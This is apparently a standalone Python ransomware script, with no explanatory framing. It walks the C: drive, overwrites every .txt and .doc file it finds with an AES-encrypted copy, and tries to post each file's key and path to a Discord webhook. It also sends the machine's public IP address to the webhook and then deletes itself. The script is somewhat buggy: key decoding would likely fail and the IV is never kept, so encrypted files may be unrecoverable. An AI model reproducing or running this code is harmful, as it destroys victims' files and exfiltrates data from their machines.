import os
import random
import getpass
import requests
import threading
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# Get the username of the current user
username = getpass.getuser()

# Define a function to scan for files in a directory
def scan_files(path):
    for root, dirs, files in os.walk(path):
        for file in files:
            if file.endswith('.txt') or file.endswith('.doc'):
                print(os.path.join(root, file))
                with open(os.path.join(root, file), "rb") as f:
                    data = f.read()
                key = os.urandom(16)
                cipher = AES.new(key, AES.MODE_CBC)
                encrypted_data = cipher.encrypt(pad(data, AES.block_size))
                with open(os.path.join(root, file), "wb") as f:
                    f.write(encrypted_data)
                key_str = str(key, 'utf-8')
                data = {"content": f"Encrypted file: {os.path.join(root, file)}, key: {key_str}"}
                response = requests.post(webhook_url, json=data)

# Get the IP address of the machine
ip = requests.get('https://api.ipify.org').text

# Send the IP address to the webhook
webhook_url = "your discord webhook"
data = {"content": f"IP address: {ip}"}
response = requests.post(webhook_url, json=data)

# Define a list of directories to scan
directories = ['C:\\']

# Create a list to hold the threads
threads = []

# Loop through the directories and create a thread for each one
for directory in directories:
    thread = threading.Thread(target=scan_files, args=(directory,))
    threads.append(thread)
    thread.start()

# Wait for all the threads to complete
for thread in threads:
    thread.join()

# Once your code is done running, add this line to delete the script file:
os.remove(__file__)